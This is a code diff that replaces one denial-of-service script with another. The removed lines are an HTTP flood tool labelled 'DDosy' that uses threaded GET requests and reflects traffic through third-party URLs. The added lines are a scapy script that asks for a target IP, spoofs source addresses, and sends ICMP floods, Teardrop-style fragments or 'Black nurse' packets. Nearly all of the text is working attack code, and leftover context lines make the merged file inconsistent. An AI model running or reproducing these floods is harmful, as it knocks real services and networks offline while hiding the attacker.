@@ -1,29 +1,23 @@
-import urllib2
-import sys
-import threading
-import random
-import re
+import sys, random
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+import scapy
+from scapy.all import *
+import config
+import multiprocessing, time
+from six.moves import input as raw_input
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
 
-def inc_counter():
-	global request_counter
-	request_counter+=9999
+dst_ip = raw_input("IP to attack: ") if config.dst_ip == "" else config.dst_ip
+n_ips = raw_input("\nNumber of IPs: ") if config.n_ips == "" else config.n_ips
+n_msg = raw_input("\nNumber of messages per IP: ") if config.n_msg == "" else config.n_msg
+interface = raw_input("\nInterface: ") if config.interface == "" else config.interface
+type = raw_input("\nSelect type: \n1) Flood \n2) Teardrop \n3) Black nurse\nYour choice: ") if config.type == "" else config.type
+orig_type = raw_input("\nSelect IPs origin: \n1) From ips.txt \n2) Random\nYour choice: ") if config.orig_type == "" else config.orig_type
+threads = 3 if config.threads == "" else int(config.threads)
 
-def set_flag(val):
-	global flag
-	flag=val
+ips = []
 
-def set_safe():
-	global safe
-	safe=1	
 # generates a user agent array
 def useragent_list():
 	global headers_useragents
@@ -3392,141 +3386,57 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 
-def my_bots():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
+def get_random_ips(n):
+	for i in range(0,int(n)):
+		ip_gen = str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255))
+		ips.append(ip_gen)
+
+def get_text_total_ips():
+	f_ips = []
+	for line in open("ips.txt"):
+		f_ips.append(line.replace('\n',''))
+	if len(f_ips) <= 1:
+		print("[-] Error: You chose to load IP addresses from ips.txt but the file is empty")
+		sys.exit(0)
+	for n in range ( 0, int( int(n_ips) / len(f_ips) ) ):
+		for ip in f_ips:
+			ips.append(ip)
+	for j in range ( 0, int( int(n_ips) % len(f_ips) ) ):
+		ips.append(f_ips[j])
+
+load = "suchaload"*162
+def sendPacketFlood(origin_ip):
+	send((IP(dst=dst_ip,src=origin_ip)/ICMP()/load)*int(n_msg), iface=interface, verbose=False)
+
+def sendPacketMF(origin_ip):
+	send((IP(dst=dst_ip, src=origin_ip, flags="MF", proto = 17, frag = 0)/ICMP()/load)*int(n_msg), iface=interface, verbose=False)
+
+def sendPacketT3(origin_ip):
+	send((IP(dst=dst_ip,src=origin_ip)/ICMP(type=3, code=3))*int(n_msg), iface=interface, verbose=False)
 
 
-def bot_ddosing(url):
-	try:
-		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is ddosing...\033[0m")
-			time.sleep(.1)
-	except:
-		time.sleep(.1)
+if orig_type == "2":
+	get_random_ips(n_ips)
+else:
+	get_text_total_ips()
 
 
-def down_it(item):
-	try:
-		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((host,int(port)))
-			if s.sendto( packet, (host, int(port)) ):
-				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! ddosing--> \033[0m")
-			else:
-				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
-			time.sleep(.1)
-	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
-		time.sleep(.1)
+# With threading
+t0 = time.time()
 
+p = multiprocessing.Pool(threads)
+if type == "1":
+	p.map(func=sendPacketFlood,iterable=ips) 
+elif type == "2":
+	p.map(func=sendPacketMF,iterable=ips) 
+elif type == "3":
+	p.map(func=sendPacketT3,iterable=ips) 
+else:
+	print("Type unknown")
+p.close()
 
-def dos():
-	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
-
-
-def dos2():
-	while True:
-		item=w.get()
-		bot_ddosing(random.choice(bots)+"http://"+host)
-		w.task_done()
-
-
-def usage():
-	print (''' \033[92m	DDosy By Sanix darker
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 ddosy.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
-
-
-def get_parameters():
-	global host
-	global port
-	global thr
-	global item
-	optp = OptionParser(add_help_option=False,epilog="DDosy")
-	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
-	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
-	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
-	opts, args = optp.parse_args()
-	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	if opts.help:
-		usage()
-	if opts.host is not None:
-		host = opts.host
-	else:
-		usage()
-	if opts.port is None:
-		port = 80
-	else:
-		port = opts.port
-	if opts.turbo is None:
-		thr = 135
-	else:
-		thr = opts.turbo
-
-
-# reading headers
-global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-#task queue are q,w
-q = Queue()
-w = Queue()
-
-
-if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		usage()
-	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
-	user_agent()
-	my_bots()
-	time.sleep(5)
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host,int(port)))
-		s.settimeout(1)
-	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
-		usage()
-	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+total_s = float(time.time() - t0)
+total_p = int(n_ips) * int(n_msg)
+ratio = float(total_p)/float(total_s)
+print ("\nTotal: \nTime:\t%d seconds" % (total_s))
+print ("Packets:\t%d \nSpeed:\t%d p/s" % (total_p, ratio))
